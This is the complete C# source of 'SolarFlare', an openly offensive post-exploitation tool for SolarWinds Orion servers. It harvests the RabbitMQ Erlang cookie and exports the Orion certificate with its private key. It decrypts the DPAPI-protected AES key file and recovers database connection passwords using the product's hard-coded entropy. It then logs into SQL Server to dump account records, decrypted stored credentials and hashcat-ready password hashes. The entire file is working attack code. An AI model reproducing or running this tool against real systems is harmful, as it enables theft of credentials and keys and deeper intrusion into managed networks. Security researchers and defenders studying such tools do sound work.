using System;
using System.IO;
using System.Security.Cryptography;
using System.Data.SqlClient;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Xml;
using System.Security.Cryptography.X509Certificates;
using System.Data;
using Microsoft.Win32;

namespace SolarFlare
{
	class Program
	{
		internal static FlareData flare = new FlareData();
		static void Main(string[] args)
        	{
			Console.WriteLine("Don't look directly into the sun...");
			Console.WriteLine("Tool created by Rob Fuller (@mubix)");
			Console.WriteLine("============================================");
			Console.WriteLine("| Collecting RabbitMQ Erlang Cookie");
            		flare.ErlangCookie = GetErlangCookie();
			if(!(string.IsNullOrEmpty(flare.ErlangCookie)))
            		{
				Console.WriteLine("| \tErlang Cookie: " + flare.ErlangCookie);
			}
			else
			{
				Console.WriteLine("| \tErlang Cookie: Not found!");
			}

			Console.WriteLine("============================================");
			Console.WriteLine("| Collecting SolarWinds Certificate");
			flare.CertData = GetCertificate();
			if(flare.CertData.IsPresent)
			{
				Console.WriteLine("| \tSubject Name: " + flare.CertData.Cert.Subject);
				Console.WriteLine("| \tThumbprint  : " + flare.CertData.Cert.Thumbprint);
				if (flare.CertData.Exported)
				{
					Console.WriteLine("| \tPassword    : " + flare.CertData.Password);
					Console.WriteLine("| \tPrivate Key : " + flare.CertData.B64pfx);
				}
			}
			else
			{
				Console.WriteLine("| Certificate NOT FOUND. Some decryption will fail...");
			}

			Console.WriteLine("============================================");
			Console.WriteLine("| Collecting Default.DAT file");
			flare.Dat = GetDat();
			if (flare.Dat.IsPresent)
			{
				Console.WriteLine("| \tEncrypted: " + flare.Dat.DatEncryptedHex);
			}
			if (flare.Dat.Decrypted)
			{
				Console.WriteLine("| \tDecrypted: " + flare.Dat.DatDecryptedHex);
			}

			Console.WriteLine("============================================");
			Console.WriteLine("| Collecting Database Credentials          |");
			GetDatabaseConnection();
			Console.WriteLine($"| \tNumber of database credentials found: {flare.Db.Credentials.Count()}");

			Console.WriteLine("============================================");
			Console.WriteLine("| Connecting to the Database              |");
			bool connected = CheckDbConnection();
			if (connected)
			{
				DumpDBCreds();
				flare.Db.Connection.Close();
			}
			else
			{
				Console.WriteLine("| \tAll Database connections failed. We have done all we can do here...");
			}
			Console.WriteLine("============================================");
			Console.WriteLine("============================================");

		}

		// Get Functions
		static string GetErlangCookie()
		{
			string path = Environment.GetEnvironmentVariable("programdata");
			path += "\\SolarWinds\\Orion\\RabbitMQ\\.erlang.cookie";
			string cookie = null;
			if (File.Exists(path))
			{
				cookie = File.ReadAllText(path);
			}
			return cookie;
		}

		static FlareData.SWCert GetCertificate()
		{
			FlareData.SWCert solarcert = new FlareData.SWCert();
			// Generate a random password to export the certificate with
			string randompath = Path.GetRandomFileName();
			solarcert.Password = randompath.Replace(".", "");
			System.Security.Cryptography.X509Certificates.X509Store store1 = new X509Store(StoreName.My, StoreLocation.LocalMachine);
			using (File.Create("C:\\Windows\\Temp\\SolarFlare")) { };
			store1.Open(OpenFlags.ReadOnly);
			solarcert.IsPresent = false;
			solarcert.Exported = false;
			foreach (X509Certificate2 certificate in store1.Certificates)
			{
				if (certificate.Subject.StartsWith("CN=SolarWinds-Orion"))
				{
					solarcert.Cert = certificate;
					solarcert.IsPresent = true;
					Console.WriteLine("| \tSolarWinds Orion Certificate Found!");
					try
					{
						if (solarcert.Cert.PrivateKey != null)
						{
							byte[] certBytes = certificate.Export(X509ContentType.Pkcs12, solarcert.Password);
							solarcert.Pfx = certBytes;
							solarcert.B64pfx = System.Convert.ToBase64String(certBytes);
							solarcert.Exported = true;
						}
					}
					catch
					{
						Console.WriteLine("| \tRequires Admin to export the cert, but decryption should still work..");
					}
				}
			}
			return solarcert;
		}

		static FlareData.DatHex GetDat()
		{
			FlareData.DatHex dat = new FlareData.DatHex();
			string path = Environment.GetEnvironmentVariable("programdata");
			path += "\\SolarWinds\\KeyStorage\\CryptoHelper\\default.dat";
			if (File.Exists(path))
			{
				using (BinaryReader binaryReader = new BinaryReader(File.Open(path, FileMode.Open, FileAccess.Read, FileShare.Read)))
				{
					int keyid = binaryReader.ReadInt32();
					int count = binaryReader.ReadInt32();
					dat.DatEncrypted = binaryReader.ReadBytes(count);
					dat.DatEncryptedHex = BitConverter.ToString(dat.DatEncrypted).Replace("-", "");
					dat.IsPresent = true;
				}

				try
				{
					dat.DatDecrypted = ProtectedData.Unprotect(dat.DatEncrypted, null, DataProtectionScope.LocalMachine);
					dat.DatDecryptedHex = BitConverter.ToString(dat.DatDecrypted).Replace("-", "");
					dat.Decrypted = true;
				}
				catch (Exception e)
				{
					Console.WriteLine(e);
				}
			}
			else
			{
				Console.WriteLine("| \tFailed to access Default.dat file");
				Console.WriteLine("| \tThis will result in a failure to decrypt AES encrypted passwords");
			}
			return dat;
		}

		static void GetDatabaseConnection()
		{
			// SolarWinds Orion uses a default entropy for it's CryptUnprotectData
			// This is currently being removed from the code base as far as I can tell
			// so this may break in the future.

			byte[] additionalEntropy = new byte[] { 2, 0, 1, 2, 0, 3, 0, 9 };


			// SWNetPerfMon is where the database configuration is, it's a simple text file
			string perfmondb = "";
			try
			{
				RegistryKey key = Registry.LocalMachine.OpenSubKey("Software\\Wow6432Node\\SolarWinds\\Orion\\Core");
				if (key != null)
				{
					object installpathkey = key.GetValue("InstallPath");
					if (installpathkey != null)
					{
						perfmondb = installpathkey as String;
						perfmondb += "SWNetPerfMon.DB";
					}
				}
				else
				{
					Console.WriteLine("============================================");
					Console.WriteLine("It doesn't appear that SolarWinds Orion is installed here. Exiting...");
					System.Environment.Exit(1);
				}
			}
			catch
			{
				perfmondb = Environment.GetEnvironmentVariable("programfiles(x86)");
				perfmondb += "\\SolarWinds\\Orion\\SWNetPerfMon.DB";
			}
			Console.WriteLine($"| \tPath to SWNetPerfMon.DB is: {perfmondb}");

			// SolarWindsDatabaseAccessCredential.json has been found to be used for external database connections
			// I don't know why this is used and why it isn't in other cases..
			string jsonpath = Environment.GetEnvironmentVariable("programdata");
			jsonpath += "\\SolarWinds\\CredentialStorage\\SolarWindsDatabaseAccessCredential.json";

			if (File.Exists(perfmondb))
			{

				Dictionary<string, string> dictionary = new Dictionary<string, string>(StringComparer.InvariantCultureIgnoreCase);
				using (StreamReader streamReader = File.OpenText(perfmondb))
				{
					string text;
					while (!streamReader.EndOfStream && (text = streamReader.ReadLine()) != null)
					{
						if (text.StartsWith("ConnectionString"))
						{

							FlareData.FlareDB.DbCredential cred = new FlareData.FlareDB.DbCredential();
							Dictionary<string, string> connString = text.Split(';')
								.Select(value => value.Split('='))
								.ToDictionary(pair => pair[0], pair => pair[1],
								StringComparer.OrdinalIgnoreCase);

							// Add the Database
							if (connString.ContainsKey("Initial Catalog"))
							{
								cred.DbDB = connString["Initial Catalog"];
							}
							// Add the Host
							if (connString.ContainsKey("Data Source"))
							{
								cred.DbHost = connString["Data Source"];
							}
							// Add the User ID
							if (connString.ContainsKey("User ID"))
							{
								cred.DbUser = connString["User ID"];
							}

							// Integrated Security
							if (connString.ContainsKey("Integrated Security"))
							{
								if (File.Exists(jsonpath))
								{
									string json = File.ReadAllText(jsonpath);
									json = json.TrimStart('{').TrimEnd('}').Replace("\"", "");
									Dictionary<string, string> jsondata = json.Split(',')
										.Select(value => value.Split(':'))
										.ToDictionary(pair => pair[0], pair => pair[1],
										StringComparer.OrdinalIgnoreCase);
									if (jsondata.ContainsKey("Password"))
									{
										cred.DbPass = Decrypt(jsondata["Password"]);
									}
									if (jsondata.ContainsKey("Username"))
									{
										cred.DbUser = jsondata["Username"];
									}
								}
							}
							else if (connString.ContainsKey("Encrypted.Password"))
							{
								byte[] byteencPass;
								string encPass = connString["Encrypted.Password"].Replace("\"", "");
								// Add padding if text parsing removed it
								try
								{
									byteencPass = Convert.FromBase64String(encPass);
								}
								catch
								{
									try
									{
										byteencPass = Convert.FromBase64String(encPass + "=");
									}
									catch
									{
										byteencPass = Convert.FromBase64String(encPass + "==");
									}
								}
								cred.DbPass = Encoding.UTF8.GetString(ProtectedData.Unprotect(byteencPass, additionalEntropy, DataProtectionScope.LocalMachine));
							}
							else if (connString.ContainsKey("Password"))
							{
								cred.DbPass = connString["Password"];
							}
							else
							{
								Console.WriteLine("--------------------------------------------");
								Console.WriteLine($"| \tUnrecognized Connection String: {connString}");
							}
							Console.WriteLine("| \tConnection String: Server=" + cred.DbHost + ";Database=" +
								cred.DbDB + ";User ID=" + cred.DbUser +
								";Password=" + cred.DbPass);
							try
							{
								flare.Db.Credentials.Add(cred);
							}
							catch (Exception e)
							{
								Console.WriteLine(e);
							}

						}
						else if (text.StartsWith("Connection"))
						{
							Console.WriteLine($"| {text}");
						}
					}
				}
			}
		}

		static bool CheckDbConnection()
		{
			if(flare.Db.Credentials.Count > 0)
			{
				foreach(FlareData.FlareDB.DbCredential sql in flare.Db.Credentials)
				{
					SqlConnection sqlconn = new SqlConnection();
					sqlconn.ConnectionString = "Server=" + sql.DbHost + ";Database=" + sql.DbDB + ";User ID=" + sql.DbUser + ";Password=" + sql.DbPass;
					sqlconn.ConnectionString += ";MultipleActiveResultSets=true";
					try
					{
						sqlconn.Open();
						if (sqlconn.State == System.Data.ConnectionState.Open)
						{
							Console.WriteLine("| \tSuccessfully connected to: {0}", sqlconn.ConnectionString);
							flare.Db.Connection = sqlconn;
							break;
						}
					}
					catch
					{
						Console.WriteLine($"| \tConnection failed to: {sqlconn.ConnectionString}");
					}
				}
			}
			if(flare.Db.Connection != null && flare.Db.Connection.State == System.Data.ConnectionState.Open)
			{
				return true;
			}
			else
			{
				return false;
			}
		}

		// Decryption Functions
		static string Decrypt(string encString)
		{
			string decrypted;
			if (encString.StartsWith("<"))
			{
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.LoadXml(encString);
				new System.Security.Cryptography.Xml.EncryptedXml(xmlDocument).DecryptDocument();
				decrypted = xmlDocument.FirstChild.InnerText;
			}
			else if(encString.StartsWith("-"))
			{
				decrypted = DecryptAes(encString);
			}
			else
			{
				decrypted = DecryptString(encString);
			}
			return decrypted;
		}

		static string DecryptString(string encString)
		{
			string decString = "";
			try
			{
				RSACryptoServiceProvider rsacrypt = (RSACryptoServiceProvider)flare.CertData.Cert.PrivateKey;
				byte[] decstringbits = rsacrypt.Decrypt(Convert.FromBase64String(encString), false);
				decString = Encoding.Unicode.GetString(decstringbits);
			}
			catch
			{
				Console.WriteLine($"| \tDecryption failed for -> {encString}");
			}
			return decString;
		}

		static string DecryptAes(string encryptedText)
		{
			if (flare.Dat.DatDecrypted != null)
			{
				string result = "";
				string[] array = encryptedText.Remove(0, "-enc-".Length).Split(new char[] { '-' });
				string s = array[1];
				using (AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider())
				{
					aesCryptoServiceProvider.BlockSize = 128;
					aesCryptoServiceProvider.Mode = CipherMode.CBC;
					aesCryptoServiceProvider.Key = flare.Dat.DatDecrypted;
					using (MemoryStream memoryStream = new MemoryStream(Convert.FromBase64String(s)))
					{
						byte[] array2 = new byte[16];
						if (memoryStream.Read(array2, 0, array2.Length) != array2.Length)
						{
							throw new InvalidOperationException("Cannot read header.");
						}
						aesCryptoServiceProvider.IV = array2;
						result = Program.DecryptFromStream(memoryStream, aesCryptoServiceProvider);
					}
				}
				return result;
			}
			else
			{
				return $"DAT FILE REQUIRED TO DECRYPT: {encryptedText}";
			}
		}

		static string DecryptFromStream(Stream stream, AesCryptoServiceProvider aes)
		{
			string result;
			using (CryptoStream cryptoStream = new CryptoStream(stream, aes.CreateDecryptor(), CryptoStreamMode.Read))
			{
				using (StreamReader streamReader = new StreamReader(cryptoStream))
				{
					result = streamReader.ReadToEnd();
				}
			}
			return result;
		}

		// Depending on how long the SolarWinds box may be around
		// It might still store the credentials in the old format
		// which can be decoded using long divion.
		static string DecodeOldPassword(string password)
		{
			if (string.IsNullOrEmpty(password))
			{
				return string.Empty;
			}
			bool flag = password.StartsWith("U-");
			if (flag)
			{
				password = password.Replace("U-", "");
			}
			string value = password.Substring(0, password.IndexOf("-"));
			password = password.Substring(password.IndexOf('-') + 1);
			password = password.Replace("-", "");
			password = password.Trim();
			string text = string.Empty;
			for (int i = 1; i <= password.Length - 1; i += 2)
			{
				text = text + password[i] + password[i - 1];
			}
			if (text.Length < password.Length)
			{
				text += password[password.Length - 1];
			}
			password = text;
			Int64.TryParse(value, out long divisor);
			text = longDivision(password, divisor);
			text = longDivision(text, 1244352345234);
			text = text.Substring(1);
			password = string.Empty;
			int num = flag ? 5 : 3;
			for (int i = 0; i < text.Length; i += num)
			{
				password += Convert.ToChar(int.Parse(text.Substring(i, Math.Min(num, text.Length - i))));
			}
			return password;
		}

		// source: https://www.geeksforgeeks.org/divide-large-number-represented-string/
		static string longDivision(string number, long divisor)
		{
			// As result can be very large store it in string
			string ans = "";

			// Find prefix of number that is larger
			// than divisor.
			int idx = 0;
			long temp = (long)(number[idx] - '0');
			while (temp < divisor)
			{
				temp = temp * 10 + (int)(number[idx + 1] - '0');
				idx++;
			}
			++idx;

			// Repeatedly divide divisor with temp. After
			// every division, update temp to include one
			// more digit.
			while (number.Length > idx)
			{
				// Store result in answer i.e. temp / divisor
				ans += (char)(temp / divisor + '0');

				// Take next digit of number
				temp = (temp % divisor) * 10 + (int)(number[idx] - '0');
				idx++;
			}
			ans += (char)(temp / divisor + '0');

			// If divisor is greater than number
			if (ans.Length == 0)
				return "0";

			// else return ans
			return ans;
		}

		// Database Functions

		static void DumpDBCreds()
		{
			// code from: https://stackoverflow.com/a/6671427
			DataTable schema = flare.Db.Connection.GetSchema("Tables");
			List<string> TableNames = new List<string>();
			foreach (DataRow row in schema.Rows)
			{
				TableNames.Add(row[2].ToString());
			}

			if(TableNames.Contains("Key"))
			{
				Console.WriteLine("============================================");
				Console.WriteLine("| DB - Exporting Key Table                 |");
				ExportKeyTable();
			}
			if (TableNames.Contains("Accounts"))
			{
				Console.WriteLine("============================================");
				Console.WriteLine("| DB - Exporting Accounts Table            |");
				ExportAccountsTable();
			}
			if (TableNames.Contains("CredentialProperty"))
			{
				Console.WriteLine("============================================");
				Console.WriteLine("| DB - Exporting Credentials Table         |");
				ExportCredsTable();
			}

		}

		// I honestly don't know what they keys are used for, if anything.
		// Will have to research this in the future...
		static void ExportKeyTable()
		{
			try
			{
				using (SqlCommand command = new SqlCommand("SELECT keyid, encryptedkey, " +
					"kind, purpose, protectiontype, protectionvalue, " +
					"protectiondetails from [dbo].[key]", flare.Db.Connection))

				using (SqlDataReader reader = command.ExecuteReader())
				{
					while (reader.Read())
					{
						Console.WriteLine($"| \tKeyID: {reader.GetInt32(0)}\n" +
							$"| \tEncrypted Key: {reader.GetString(1)}\n" +
							$"| \tKind: {reader.GetString(2)}\n" +
							$"| \tPurpose: {reader.GetString(3)}\n" +
							$"| \tProtection Type: {reader.GetInt32(4)}\n" +
							$"| \tProtection Value: {reader.GetString(5)}\n" +
							$"| \tProtection Details: {reader.GetString(6)}\n" +
							$"------------------------------------------------");
					}
					reader.Close();
				}
			}
			catch (Exception e)
			{
				Console.WriteLine("| [-] Something went wrong: {0}", e);
			}
		}

		static List<string> GetColumnList(string tablename)
		{
			List<string> columnlist = new List<string>();
			using (SqlCommand command = new SqlCommand($"select c.name from sys.columns c inner join sys.tables t" +
				" on t.object_id = c.object_id and t.name = '" + tablename + "' and t.type = 'U'", flare.Db.Connection))
			using (SqlDataReader reader = command.ExecuteReader())
			{
				while (reader.Read())
				{
					columnlist.Add(reader.GetString(0));
				}
				reader.Close();
			}
			return columnlist;
		}

		static void ExportAccountsTable()
		{
			List<string> columnlist = new List<string>();
			columnlist = GetColumnList("Accounts");
			if(columnlist.Contains("Password"))
			{
				using (SqlCommand command = new SqlCommand("SELECT accountid, password, " +
					"passwordhash, accountenabled, allowadmin, lastlogin, accountsid, " +
					"groupinfo from [dbo].[Accounts]", flare.Db.Connection))
				using (SqlDataReader reader = command.ExecuteReader())
				{
					while (reader.Read())
					{
						if (!reader.IsDBNull(0)) { Console.WriteLine("|\t Account: " + reader.GetString(0)); }
						if (!reader.IsDBNull(1)) { Console.WriteLine("|\t Password: " + reader.GetString(1)); }
						try
						{
							string password = DecodeOldPassword(reader.GetString(1));
							Console.WriteLine("|\t Decoded Password: " + password);
						}
						catch { }
						if (!reader.IsDBNull(2)) { Console.WriteLine($"|\t Hashcat Mode 21500: $solarwinds$0${reader.GetString(0).ToLower()}${reader.GetString(2)}"); }
						if (!reader.IsDBNull(3)) { Console.WriteLine("|\t Account Enabled: " + reader.GetString(3)); }
						if (!reader.IsDBNull(4)) { Console.WriteLine("|\t Allow Admin: " + reader.GetString(4)); }
						if (!reader.IsDBNull(5)) { Console.WriteLine("|\t Last Login: " + reader.GetDateTime(5).ToString("MM/dd/yyyy")); }
						if (!reader.IsDBNull(6)) { Console.WriteLine("|\t Account SID: " + reader.GetString(6)); }
						if (!reader.IsDBNull(7)) { Console.WriteLine("|\t Group: " + reader.GetString(7)); }
						Console.WriteLine("--------------------------------------------");
					}
					reader.Close();
				}

			}
			else
			{
				using (SqlCommand command = new SqlCommand("SELECT accountid, passwordhash, passwordsalt, " +
					"accountenabled, allowadmin, lastlogin, accountsid, " +
					"groupinfo from [dbo].[Accounts]", flare.Db.Connection))
				using (SqlDataReader reader = command.ExecuteReader())
				{
					while (reader.Read())
					{
						if (!reader.IsDBNull(0)) { Console.WriteLine("|\t Account: " + reader.GetString(0)); }
						if (!reader.IsDBNull(1)) { Console.WriteLine("|\t Password Hash: " + reader.GetString(1)); }
						if (!reader.IsDBNull(2))
						{
							Console.WriteLine("|\t Password Salt: " + reader.GetString(2));
							try
							{
								Console.WriteLine($"|\t Hashcat Mode 12501: $solarwinds$1${reader.GetString(2)}${reader.GetString(1)}");
							}
							catch { }
						}
						else
						{
							Console.WriteLine("|\t Salt is NULL in DB so lowercase username is used: " + reader.GetString(0).ToLower());
							Console.WriteLine($"|\t Hashcat Mode 12500: $solarwinds$0${reader.GetString(0).ToLower()}${reader.GetString(1)}");
						}
						if (!reader.IsDBNull(3)) { Console.WriteLine("|\t Account Enabled: " + reader.GetString(3)); }
						if (!reader.IsDBNull(4)) { Console.WriteLine("|\t Allow Admin: " + reader.GetString(4)); }
						if (!reader.IsDBNull(5)) { Console.WriteLine("|\t Last Login: " + reader.GetDateTime(5).ToString("MM/dd/yyyy")); }
						if (!reader.IsDBNull(6)) { Console.WriteLine("|\t Account SID: " + reader.GetString(6)); }
						if (!reader.IsDBNull(7)) { Console.WriteLine("|\t Group: " + reader.GetString(7)); }
						Console.WriteLine("--------------------------------------------");
					}
					reader.Close();
				}
			}
		}

		static void ExportCredsTable()
		{
			try
			{
				using (SqlCommand command = new SqlCommand("SELECT id, name, description, " +
					"credentialtype, credentialowner from [dbo].[Credential]", flare.Db.Connection))
				using (SqlDataReader reader = command.ExecuteReader())
				{
					while (reader.Read())
					{
						int cred_id = reader.GetInt32(0);
						string cred_name = "";
						string cred_desc = "";

						if (!reader.IsDBNull(1)) { cred_name = reader.GetString(1); }
						if (!reader.IsDBNull(2)) { cred_desc = reader.GetString(2); }
						string cred_type = reader.GetString(3);
						string cred_owner = reader.GetString(4);

						Console.WriteLine($"------------------{cred_id}--------------------------");
						Console.WriteLine($"| Type: {cred_type}");
						Console.WriteLine($"| Name: {cred_name}");
						Console.WriteLine($"| \tDesc: {cred_desc}");
						Console.WriteLine($"| \tOwner: {cred_owner}");

						using (SqlCommand proptable = new SqlCommand("SELECT name, value, encrypted " +
							$"from [dbo].[CredentialProperty] where credentialid={cred_id}", flare.Db.Connection))
						using (SqlDataReader proptablereader = proptable.ExecuteReader())
						{
							Dictionary<string, string> props = new Dictionary<string, string>();
							while (proptablereader.Read())
							{

								string name = "";
								string value = "";
								if (!proptablereader.IsDBNull(0)) { name = proptablereader.GetString(0); }
								if (!proptablereader.IsDBNull(1)) { value = proptablereader.GetString(1); }
								bool encbool = proptablereader.GetBoolean(2);
								if (!encbool)
								{
									props.Add(name, value);
								}
								else
								{
									props.Add(name, Decrypt(value));
								}
							}
							proptablereader.Close();
							foreach (KeyValuePair<string, string> kvp in props)
							{
								Console.WriteLine($"| \t\t{kvp.Key}: {kvp.Value}");
							}
						}
						Console.WriteLine($"------------------{cred_id}--------------------------");
					}
					reader.Close();
				}
			}
			catch(Exception e)
			{
				Console.WriteLine("| Credential table not found or we had a decryption error... That's weird...");
				Console.WriteLine("| Exception: " + e);
			}
		}

		// Source: https://stackoverflow.com/a/321404
		public static byte[] StringToByteArray(string hex)
		{
			return Enumerable.Range(0, hex.Length)
							 .Where(x => x % 2 == 0)
							 .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
							 .ToArray();
		}
		// Source: https://stackoverflow.com/a/311179
		public static string ByteArrayToString(byte[] ba)
		{
			return BitConverter.ToString(ba).Replace("-", "");
		}

		internal class FlareData
		{

			internal class FlareDB
			{
				internal SqlConnection Connection { get; set; }
				internal List<DbCredential> Credentials { get; set; } = new List<DbCredential>();

				internal class DbCredential
				{
					internal string DbHost { get; set; }
					internal string DbUser { get; set; }
					internal string DbPass { get; set; }
					internal string DbDB { get; set; }
				}

			}

			internal class SWCert
			{
				internal X509Certificate2 Cert { get; set; }
				internal byte[] Pfx { get; set; }
				internal string B64pfx { get; set; }
				internal string Password { get; set; }
				internal bool IsPresent { get; set; }
				internal bool Exported { get; set; }
			}

			internal class DatHex
			{
				internal byte[] DatEncrypted { get; set; }
				internal string DatEncryptedHex { get; set; }
				internal byte[] DatDecrypted { get; set; }
				internal string DatDecryptedHex { get; set; }
				internal bool IsPresent { get; set; }
				internal bool Decrypted { get; set; }
			}

			internal DatHex Dat { get; set; }
			internal SWCert CertData { get; set; }
			internal string CertPass { get; set; }
			internal string ErlangCookie { get; set; }
			internal FlareDB Db { get; set; } = new FlareDB();
		}
	}


}
